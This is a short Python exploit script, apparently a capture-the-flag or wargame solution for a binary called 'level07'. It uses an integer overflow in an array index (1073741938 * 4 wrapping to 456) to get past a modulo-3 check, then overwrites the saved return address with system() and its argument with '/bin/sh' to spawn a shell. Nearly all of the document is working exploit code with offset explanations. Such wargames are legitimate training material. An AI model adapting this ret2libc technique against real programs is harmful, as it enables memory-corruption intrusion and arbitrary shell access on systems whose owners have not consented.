#!/usr/bin/python
import struct

# Exploit for Level 07
# Integer overflow in index calculation allows overwriting EIP
# We overwrite EIP with system() and the argument with "/bin/sh"

# Addresses (found via GDB)
system_addr = 4159090384    # 0xf7e6aed0
binsh_addr = 4160264172     # 0xf7f897ec

# Indices
# 114 is the index for EIP (456 bytes / 4)
# 114 % 3 == 0, so we use overflow:
# 1073741938 * 4 = 4294967752 (overflows to 456)
# 1073741938 % 3 = 1 (allowed)
eip_index = 1073741938

# 116 is the index for the first argument
# 116 % 3 = 2 (allowed)
arg_index = 116

# Payload
payload = "store\n"
payload += str(system_addr) + "\n"
payload += str(eip_index) + "\n"
payload += "store\n"
payload += str(binsh_addr) + "\n"
payload += str(arg_index) + "\n"
payload += "quit\n"

print(payload)

# Usage: python exploit.py | ./level07
